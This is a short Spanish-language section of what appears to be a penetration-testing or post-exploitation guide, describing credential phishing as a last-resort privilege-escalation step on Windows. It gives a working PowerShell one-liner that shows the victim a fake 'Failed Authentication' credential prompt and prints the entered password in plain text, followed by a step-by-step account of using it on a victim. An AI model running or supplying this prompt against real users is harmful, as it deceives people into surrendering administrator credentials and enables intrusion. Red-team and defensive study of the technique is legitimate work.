Phising

Como último recurso, cuando toda opción de escalada de privilegios haya sido descartada, es posible realizar ataques de phising al usuario para que introduzca las credenciales de administrador haciéndose pasar por una petición legítima. Esta técnica puede levantar muchas sospechas por el comportamiento anómalo y puede poner en peligro la intrusión inicial.

◍ Ataque

El siguiente código abrirá al usuario un cuadro para introducir sus credenciales haciéndose pasar por una aplicación legítima. 

$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
#Para recoger las credenciales
$cred.GetNetworkCredential() | fl

EJEMPLO

Inicialmente copiamos y pegamso la primera linea del script sugerido.

Al ser ejecutada, le aparecerá el siguiente recuadro del usuario en la pantalla pidiéndole las credenciales para poder acceder a algo.

Si la víctima cae y escribe las credenciales, las recuperamos con la segunda línea del script sugerido.
